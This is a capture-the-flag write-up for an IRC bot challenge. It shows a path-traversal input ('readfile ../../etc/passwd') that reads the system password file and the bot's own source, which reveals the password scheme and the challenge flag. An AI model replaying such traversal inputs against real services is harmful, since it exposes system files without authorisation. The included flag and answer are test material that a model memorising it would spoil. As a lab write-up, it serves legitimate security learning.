# boomer / Oldschool IRC

## Question

> Yo, I heard you like old-school stuff.
> In ancient times, there were IRC networks.
> They were full of great people and helpful bots.
>
> Check out this IRC server and talk to the OP in `#challenge`
> (enable TLS in your IRC client!).
>
> Since the OP is a bot, he is not very talkative.
> Surely you'll figure out how to communicate with him!
>
> P.S. For a true 0ldsch00l experience, use an command line IRC client like `irssi` :)

## Solution

After [connecting to the IRC server](./sanity.md) and navigating to `#challenge`, we see that the other user is `BottyMcBotface`.
Trying a few basic commands in direct messages, we get a response with `help`

```
<retro> help
<BottyMcBotface> Available commands: bmi, update, youtube, whoareyou, tvdb, maze, ep, giveflag, readfile, storefile, cache . Note: For specific command help, use: help [<command>]
```

The `giveflag` command requires a password.
The `readfile` and `storefile` commands seem to write text to a file and retrieve it.
Notice that there's given names of Python files for "debugging".

```
<retro> help readfile
<BottyMcBotface> Help for readfile: [DEBUG: module_readfile.py]  Reads a file from the ./uploads folder. Usage: readfile [filename]
```

We can escape the current working directory with `readfile`.
Try increasing numbers of `../` with a known filename:

```
<retro> readfile ../../etc/passwd
<BottyMcBotface> Content of file ./uploads/../../etc/passwd: root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin                 sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
<BottyMcBotface> lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
<BottyMcBotface> ...mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin                 proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:                 Manager:/var/list:/usr/sbin/nologin
<BottyMcBotface> ...irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
                 nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/bin/false messagebus:x:101:101::/var/run/dbus:/bin/false ctf:x:1000:1000::/home/ctf/:/bin/bash                        !
```

Trying the `whoareyou` command reveals that BottyMcBotface runs on `pyfibot`.

```
<retro> whoareyou
<BottyMcBotface> I'm glad you are interested in me! I'm a pyfibot, running on commit 2990edfd138cc63284728bdce7016a53ca025342. I also like bits an bytes. Check out my cool modules! I hopy we can be
                 friends! <3
```

We now know to look in a `pyfibot/modules` folder for a module called `module_giveflag.py`.
Once we find it through trial and error, we get the flag.

```
<retro> readfile ../pyfibot/modules/module_giveflag.py
<BottyMcBotface> Content of file ./uploads/../pyfibot/modules/module_giveflag.py: # -*- coding: utf-8 -*- """Simple data storage for files in /uploads """  from __future__ import unicode_literals,
                 print_function, division import os   def command_giveflag(bot, user, channel, args):     """[DEBUG: module_giveflag.py] Usage: giveflag [password]"""     params = args.split(u" ")
<BottyMcBotface> print(params)     if len(params) < 1
<BottyMcBotface> ...or len(params[0]) == 0:         bot.say(channel, "No password provided. Go away!")         return      password = params[0].decode("utf-8")          username = user.split("!")[0]                            if (password == username + "_can_h4ndl3_0ldschool_irc"):         bot.say(channel, "Good job! Your flag is: ALLES{0ld_sch0ol_1rc_was_sooooo0_c00l!4857}")     else:
<BottyMcBotface> bot.say(channel, "Thats not the password. Try
<BottyMcBotface> ...harder")      return   !
```

### Flag

`ALLES{0ld_sch0ol_1rc_was_sooooo0_c00l!4857}`
